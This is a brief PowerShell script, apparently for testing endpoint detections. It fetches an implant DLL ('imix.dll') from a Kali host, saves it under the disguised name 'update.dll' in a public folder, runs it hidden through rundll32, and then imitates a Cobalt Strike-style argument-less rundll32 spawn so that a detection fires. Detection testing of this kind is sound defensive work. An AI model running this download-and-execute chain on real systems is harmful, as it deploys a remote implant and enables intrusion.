param([Parameter(Mandatory=$true)][string]$Kali, [int]$Port = 8000)
Write-Host "[1] pulling imix.dll..."
try { Invoke-WebRequest "http://${Kali}:${Port}/imix.dll" -OutFile C:\Users\Public\update.dll }
catch { Write-Warning "imix.dll not on share (did you build --lib?)"; exit 1 }
Write-Host "[2] rundll32 with DLL argument..."
Start-Process rundll32.exe -ArgumentList "C:\Users\Public\update.dll,Start" -WindowStyle Hidden
Write-Host "[3] argument-less rundll32 (CS spawn posture - expect PROC-RUNDLL-NOARG)..."
Start-Process rundll32.exe -WindowStyle Hidden
Write-Host "watch the LIVE panel"
